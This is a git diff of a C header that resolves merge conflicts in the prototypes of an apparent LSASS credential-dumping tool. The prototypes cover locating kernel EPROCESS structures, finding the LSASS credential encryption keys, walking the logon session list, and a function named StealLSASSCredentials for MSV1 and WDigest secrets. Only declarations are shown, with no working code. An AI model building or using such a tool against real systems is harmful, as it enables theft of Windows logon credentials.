@@ -26,34 +26,19 @@ BOOL TranslateP2V(DWORD64 PhysicalAddress, DWORD64* VirtualAddress);
 DWORD64 GetDataSectionBase(DWORD64 ImageStartAddress, DWORD64 ImageEndAddress, DWORD TargetUniqueProcessKey, DWORD TargetPID);
 
 // eprocess.c
-<<<<<<< HEAD
-DWORD64 GetNtEprocessAddress(HANDLE hFile);
-DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, DWORD dBuildNumber);
-
-// lsass.c
-DWORD64 GetDataSectionOffset(char* TargetModule);
-BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials);
-=======
 DWORD64 GetNtEprocessAddress(HANDLE hFile, int provId);
-DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, char* pvWindowsVersion, int provId);
+DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, DWORD dBuildNumber, int provId);
 
 // lsass.c
 DWORD64 GetDataSectionOffset(char* TargetModule);
-BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials, int provId);
->>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
+BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials, int provId);
 
 // lsass_getkeys.c
 BOOL SearchForCredentialKeys(DWORD dBuildNumber, DWORD64* hAesKeyAddress, DWORD64* h3DesKeyAddress, DWORD64* IVAddress);
 
 // lsass_logonpasswords.c
-<<<<<<< HEAD
-DWORD64 IsValidLogonSessionListHead(HANDLE hFile, DWORD64 PAToSearch, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress);
-DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD dBuildNumber, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress);
-BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector);
-=======
-DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress, int provId);
+DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress, DWORD dBuildNumber, int provId);
 BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector, int provId);
->>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
 
 // lsass_wdigest.c
 DWORD64 SearchForLogSessList(void);
